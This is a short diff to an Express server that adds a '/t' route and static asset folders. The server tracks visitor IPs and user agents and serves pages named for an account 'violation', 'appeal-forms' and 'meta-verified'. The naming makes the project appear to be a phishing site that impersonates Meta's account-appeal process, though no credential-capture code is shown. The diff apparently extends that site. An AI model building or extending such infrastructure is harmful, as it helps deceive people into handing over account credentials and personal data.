@@ -119,7 +119,7 @@ app.use((req, res, next) => {
 app.use((req, res, next) => {
     if (req.path.startsWith('/api/') || req.path.startsWith('/lang/') || req.path.startsWith('/img/') || req.path === '/i18n.js' || req.path === '/analytics') return next();
     // Only track valid page routes (whitelist)
-    const validPages = ['/home', '/appeal-forms', '/meta-verified'];
+    const validPages = ['/home', '/appeal-forms', '/meta-verified', '/t'];
     if (!validPages.includes(req.path)) return next();
     const ip = req.ip || req.headers['x-forwarded-for']?.split(',')[0] || 'unknown';
     const ua = req.headers['user-agent'] || '';
@@ -468,12 +468,16 @@ app.use('/lang', express.static(path.join(__dirname, 'lang')));
 app.use('/img', express.static(path.join(__dirname, 'img')));
 app.use('/i18n.js', express.static(path.join(__dirname, 'i18n.js')));
 app.use('/v2-assets/i18n.js', express.static(path.join(__dirname, 'i18n.js')));
+// Serve public assets (JS/CSS/images) and project styles
+app.use('/public', express.static(path.join(__dirname, 'public')));
+app.use('/styles', express.static(path.join(__dirname, 'styles')));
 
 // ===== PAGE ROUTES =====
 app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'index.html')));
 app.get('/home', (req, res) => res.sendFile(path.join(__dirname, 'violation.html')));
 app.get('/appeal-forms', (req, res) => res.sendFile(path.join(__dirname, 'form.html')));
 app.get('/meta-verified', (req, res) => res.sendFile(path.join(__dirname, 'meta-verified.html')));
+app.get('/t', (req, res) => res.sendFile(path.join(__dirname, 't.html')));
 
 // ===== API: detect-lang =====
 app.get('/api/detect-lang', async (req, res) => {
